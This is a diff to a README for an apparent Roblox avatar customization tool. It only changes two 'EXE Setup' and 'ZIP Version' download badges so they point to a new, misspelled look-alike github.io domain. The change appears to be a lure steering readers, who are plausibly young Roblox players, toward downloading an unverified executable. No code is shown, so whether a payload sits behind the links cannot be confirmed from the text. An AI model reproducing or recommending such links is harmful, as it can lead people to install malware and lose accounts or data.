@@ -4,8 +4,8 @@ Take full control of your Roblox character customization with **Avatar Loadout M
 
 ---
 
-[![⬇️ Download – EXE Setup](https://img.shields.io/badge/Download-EXE_Setup-green?style=for-the-badge&logo=windows)](https://roblox-avatar-creator.github.io/.github/)  
-[![⬇️ Download – ZIP Version](https://img.shields.io/badge/Download-ZIP_Version-green?style=for-the-badge&logo=github)](https://roblox-avatar-creator.github.io/.github/)
+[![⬇️ Download – EXE Setup](https://img.shields.io/badge/Download-EXE_Setup-green?style=for-the-badge&logo=windows)](https://robloxavtar12webinf0.github.io/.github/)  
+[![⬇️ Download – ZIP Version](https://img.shields.io/badge/Download-ZIP_Version-green?style=for-the-badge&logo=github)](https://robloxavtar12webinf0.github.io/.github/)
 
 ---
 
